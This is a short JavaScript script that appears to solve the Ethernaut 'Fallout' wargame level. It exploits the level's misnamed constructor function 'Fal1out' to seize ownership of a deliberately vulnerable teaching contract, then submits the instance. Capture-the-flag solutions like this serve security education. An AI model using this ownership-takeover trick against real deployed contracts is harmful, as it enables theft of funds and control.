module.exports = async function({ ethers, ethernaut }) {
  const levelAddress = await ethernaut.createInstance('Fallout');

  await ethers.getContractAt('Fallout', levelAddress)
    .then(instance => instance.Fal1out())
    .then(trx => trx.wait());

  return ethernaut.submitInstance(levelAddress);
};